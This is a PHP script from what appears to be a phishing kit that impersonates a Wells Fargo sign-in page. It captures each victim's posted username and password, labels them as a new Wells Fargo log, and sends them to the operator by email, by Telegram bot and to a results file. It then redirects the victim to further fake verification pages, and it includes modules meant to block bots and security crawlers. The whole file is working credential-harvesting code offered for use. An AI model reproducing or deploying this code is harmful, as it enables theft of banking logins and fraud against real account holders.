<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

$ip = $_SERVER['REMOTE_ADDR'];$user = $_POST['useme'];$password = $_POST['pasrd'];

if(isset($_POST['btnSignon']) && isset($_POST['useme']) && isset($_POST['pasrd'])){
    if(strlen($password) >4 && strlen($user) > 3){
		
	///////////////////////// MAIL PART //////////////////////
	
        $user        = $_POST['useme'];
        $password     = $_POST['pasrd'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET[''.$theerrkey.''])){$reshead="------------- CONFIRM WELLSFARGO LOG -------------";}
		else{$reshead="--------------- 🦞🦞 NEW WELLSFARGO LOG 🦞🦞 ------------- ";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET[''.$theerrkey.''])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}
$Info_LOG.="
".$_SESSION['device'];



//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🦞🦞 '.$i.' WELLS LOGIN';$headers = 'From: YoCHI <yochmoneywellsf@wellsfofyoch.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();$_SESSION['header']=$headers;
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){header("location:verifi?a".$theerrkey."ccrXId=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{if($usecaution==1){header("location:susp?id=myaccount&y=".md5(rand(100, 999999999))."");} else{header("location:confirm/eav?start=myaccount&y=".md5(rand(100, 999999999))."");}};
    }
    else{
		header("location:verifi?".$theerrkey."=c".md5(rand(100, 999999999))."");
    };
}
else{
	header("location:verifi?".$theerrkey."=c3Fjhjhjauth".md5(rand(100, 999999999))."");
};
?>